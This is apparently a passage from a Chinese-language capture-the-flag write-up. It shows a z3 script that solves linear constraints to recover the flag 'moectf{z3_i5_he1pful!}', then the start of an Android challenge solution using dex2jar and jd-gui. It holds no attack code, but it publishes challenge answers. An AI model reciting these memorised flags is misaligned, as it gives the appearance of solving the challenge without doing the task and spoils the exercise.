s.add(flag[0] * 9025 + flag[1] * 9536 + flag[2] * 1515 + flag[3] * 8177 + flag[4] * 6109 + flag[5] * 4856 + flag[6] * 6692 + flag[7] * 4929 + flag[8] * 1010 + flag[9] * 3995 + flag[10] * 3511 + flag[11] * 5910 + flag[12] * 3501 + flag[13] * 3731 + flag[14] * 6601 + flag[15] * 6200 + flag[16] * 8177 + flag[17] * 5488 + flag[18] * 5957 + flag[19] * 9661 + flag[20] * 4956 + flag[21] * 48 == 11822714)
s.add(flag[0] * 4462 + flag[1] * 1940 + flag[2] * 5956 + flag[3] * 4965 + flag[4] * 9268 + flag[5] * 9627 + flag[6] * 3564 + flag[7] * 5417 + flag[8] * 2039 + flag[9] * 7269 + flag[10] * 9667 + flag[11] * 4158 + flag[12] * 2856 + flag[13] * 2851 + flag[14] * 9696 + flag[15] * 5986 + flag[16] * 6237 + flag[17] * 5845 + flag[18] * 5467 + flag[19] * 5227 + flag[20] * 4771 + flag[21] * 72 == 11486796)
s.add(flag[0] * 4618 + flag[1] * 8621 + flag[2] * 8144 + flag[3] * 7115 + flag[4] * 1577 + flag[5] * 8602 + flag[6] * 3886 + flag[7] * 3712 + flag[8] * 1258 + flag[9] * 7063 + flag[10] * 1872 + flag[11] * 9855 + flag[12] * 4167 + flag[13] * 7615 + flag[14] * 6298 + flag[15] * 7682 + flag[16] * 8795 + flag[17] * 3856 + flag[18] * 6217 + flag[19] * 5764 + flag[20] * 5076 + flag[21] * 93 == 11540145)
s.add(flag[0] * 7466 + flag[1] * 8442 + flag[2] * 4822 + flag[3] * 7639 + flag[4] * 2049 + flag[5] * 7311 + flag[6] * 5816 + flag[7] * 8433 + flag[8] * 5905 + flag[9] * 4838 + flag[10] * 1251 + flag[11] * 8184 + flag[12] * 6465 + flag[13] * 4634 + flag[14] * 5513 + flag[15] * 3160 + flag[16] * 6720 + flag[17] * 9205 + flag[18] * 6671 + flag[19] * 7716 + flag[20] * 1905 + flag[21] * 29 == 12227250)
s.add(flag[0] * 5926 + flag[1] * 9095 + flag[2] * 2048 + flag[3] * 4639 + flag[4] * 3035 + flag[5] * 9560 + flag[6] * 1591 + flag[7] * 2392 + flag[8] * 1812 + flag[9] * 6732 + flag[10] * 9454 + flag[11] * 8175 + flag[12] * 7346 + flag[13] * 6333 + flag[14] * 9812 + flag[15] * 2034 + flag[16] * 6634 + flag[17] * 1762 + flag[18] * 7058 + flag[19] * 3524 + flag[20] * 7462 + flag[21] * 11 == 11118093)

s.check()

s.model()
```

输出如下

```python
[flag[7] = 122,
 flag[17] = 102,
 flag[1] = 111,
 flag[20] = 33,
 flag[0] = 109,
 flag[19] = 108,
 flag[13] = 104,
 flag[12] = 95,
 flag[15] = 49,
 flag[2] = 101,
 flag[9] = 95,
 flag[5] = 102,
 flag[11] = 53,
 flag[21] = 125,
 flag[8] = 51,
 flag[16] = 112,
 flag[18] = 117,
 flag[6] = 123,
 flag[4] = 116,
 flag[3] = 99,
 flag[10] = 105,
 flag[14] = 101]
```

整理一下

```python
flag[7]=122
flag[17]=102
flag[1]=111
flag[20]=33
flag[0]=109
flag[19]=108
flag[13]=104
flag[12]=95
flag[15]=49
flag[2]=101
flag[9]=95
flag[5]=102
flag[11]=53
flag[21]=125
flag[8]=51
flag[16]=112
flag[18]=117
flag[6]=123
flag[4]=116
flag[3]=99
flag[10]=105
flag[14]=101

''.join([chr(i) for i in flag])
```

得到 flag

```
moectf{z3_i5_he1pful!}
```

### Android Cracker

解压缩后提取三个 dex 文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209112129334.png)

然后利用 dex2jar 得到 jar

```cmd
C:\Users\46224\Desktop\Tools\CTF\android\dex-tools-2.1>d2j-dex2jar.bat classes.dex
dex2jar classes.dex -> .\classes-dex2jar.jar

C:\Users\46224\Desktop\Tools\CTF\android\dex-tools-2.1>d2j-dex2jar.bat classes2.dex
dex2jar classes2.dex -> .\classes2-dex2jar.jar

C:\Users\46224\Desktop\Tools\CTF\android\dex-tools-2.1>d2j-dex2jar.bat classes3.dex
dex2jar classes3.dex -> .\classes3-dex2jar.jar
```

jd-gui 打开, flag 在 classes3 里面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209112131414.png)

